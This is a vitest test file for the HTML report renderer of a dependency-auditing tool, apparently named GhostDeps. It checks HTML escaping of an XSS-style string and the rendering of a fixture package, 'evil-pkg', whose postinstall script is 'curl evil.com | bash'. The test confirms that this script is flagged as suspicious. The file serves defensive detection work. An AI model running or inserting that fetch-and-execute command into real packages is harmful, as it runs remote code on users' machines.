import { describe, expect, it } from 'vitest';
import { escapeHtml, renderHtml } from '../src/render/html.js';
import type { PackageReport, Summary } from '../src/types.js';

describe('escapeHtml', () => {
  it('escapa caracteres peligrosos', () => {
    expect(escapeHtml('<script>alert("xss")&\'</script>')).toBe(
      '&lt;script&gt;alert(&quot;xss&quot;)&amp;&#39;&lt;/script&gt;',
    );
  });
});

describe('renderHtml', () => {
  it('genera reporte HTML válido y autónomo', () => {
    const summary: Summary = {
      total: 2,
      healthy: 1,
      caution: 0,
      critical: 1,
      notEvaluable: 0,
      errors: 0,
    };

    const reports: PackageReport[] = [
      {
        name: 'safe-pkg',
        registryName: 'safe-pkg',
        spec: '^1.0.0',
        kind: 'dependencies',
        depth: 1,
        via: [],
        status: 'evaluated',
        reason: null,
        npm: {
          name: 'safe-pkg',
          latestVersion: '1.0.0',
          latestPublishedAt: '2024-01-01T00:00:00Z',
          previousPublishedAt: null,
          deprecated: null,
          maintainers: ['alice'],
          repository: null,
          rawRepositoryUrl: null,
          latestPublisher: 'alice',
          previousPublishers: [],
          maintainersChange: null,
          installScripts: { hasInstallScripts: false, suspicious: false, scripts: [] },
          hasProvenance: true,
          license: 'MIT',
        },
        github: null,
        signals: {
          daysSinceLastCommit: null,
          daysSinceLastPublish: 10,
          publishGapDays: null,
          archived: false,
          deprecated: false,
          activeMaintainers: null,
          unansweredIssues: null,
          repoRedirected: false,
          maintainersAdded: [],
          newPublisher: false,
        },
        result: {
          score: 100,
          category: 'healthy',
          penalties: [],
          mainAlert: null,
        },
      },
      {
        name: 'evil-pkg',
        registryName: 'evil-pkg',
        spec: '^2.0.0',
        kind: 'transitive',
        depth: 2,
        via: ['safe-pkg'],
        status: 'evaluated',
        reason: null,
        npm: {
          name: 'evil-pkg',
          latestVersion: '2.0.0',
          latestPublishedAt: '2024-01-01T00:00:00Z',
          previousPublishedAt: null,
          deprecated: null,
          maintainers: ['mallory'],
          repository: null,
          rawRepositoryUrl: null,
          latestPublisher: 'mallory',
          previousPublishers: [],
          maintainersChange: null,
          installScripts: {
            hasInstallScripts: true,
            suspicious: true,
            scripts: [{ stage: 'postinstall', command: 'curl evil.com | bash', suspicious: true }],
          },
          hasProvenance: false,
          license: 'GPL-3.0',
        },
        github: null,
        signals: {
          daysSinceLastCommit: null,
          daysSinceLastPublish: 5,
          publishGapDays: null,
          archived: false,
          deprecated: false,
          activeMaintainers: null,
          unansweredIssues: null,
          repoRedirected: false,
          maintainersAdded: [],
          newPublisher: true,
          installScripts: {
            hasInstallScripts: true,
            suspicious: true,
            scripts: [{ stage: 'postinstall', command: 'curl evil.com | bash', suspicious: true }],
          },
          hasProvenance: false,
          license: 'GPL-3.0',
        },
        result: {
          score: 15,
          category: 'critical',
          penalties: [{ id: 'suspicious-install-scripts', points: 35, message: 'Script sospechoso' }],
          mainAlert: { id: 'suspicious-install-scripts', points: 35, message: 'Script sospechoso' },
        },
      },
    ];

    const html = renderHtml(reports, summary, new Date('2024-05-01T00:00:00Z'), {
      version: '0.4.0',
      projectName: 'test-app',
    });

    expect(html).toContain('<!DOCTYPE html>');
    expect(html).toContain('GhostDeps Reporte — test-app');
    expect(html).toContain('safe-pkg');
    expect(html).toContain('evil-pkg');
    expect(html).toContain('score-healthy');
    expect(html).toContain('score-critical');
    expect(html).toContain('badge-warn');
    expect(html).toContain('curl evil.com | bash');
    expect(html).toContain('safe-pkg › <strong>evil-pkg</strong>');
    expect(html).toContain('setFilter');
  });
});
